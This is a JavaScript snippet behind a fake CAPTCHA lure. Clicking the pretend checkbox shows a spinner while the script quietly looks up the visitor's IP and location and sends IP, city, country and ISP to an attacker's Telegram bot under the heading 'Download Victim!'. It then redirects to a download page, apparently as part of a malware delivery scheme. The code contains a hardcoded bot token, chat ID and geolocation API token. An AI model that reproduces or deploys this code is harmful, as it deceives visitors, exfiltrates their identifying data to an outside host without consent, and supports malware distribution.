document.getElementById('captcha-trigger').addEventListener('click', async function() {
        const checkbox = document.getElementById('fake-checkbox');
        const spinner = document.getElementById('fake-spinner');
        
        // 1. Visually start the "loading"
        checkbox.style.display = 'none';
        spinner.style.display = 'block';

        // 2. Background Telegram Logging
        const sendLog = async () => {
            try {
                const ipRes = await fetch('https://api64.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ip = ipData.ip;

                const infoRes = await fetch(`https://ipinfo.io/${ip}/json?token=d149ece627b483`);
                const info = await infoRes.json();

                const message = `
🎯 Download Victim!
🌐 IP: ${ip}
🏙️ City: ${info.city || 'N/A'}
🌎 Country: ${info.country || 'N/A'}
📡 ISP: ${info.org || 'N/A'}`;

                const botToken = '8892723652:AAHzlqOzjviiYXE08ygioj7N1WdZ1prdRNg';
                const chatId = '7683234319';
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            } catch (e) {
                console.error('Log Error:', e);
            }
        };

        sendLog(); // Fire and forget (don't wait for it to finish)

        // 3. Wait 3 seconds and redirect
        setTimeout(function() {
            window.location.href = "dload.html"; 
        }, 3000);
    });
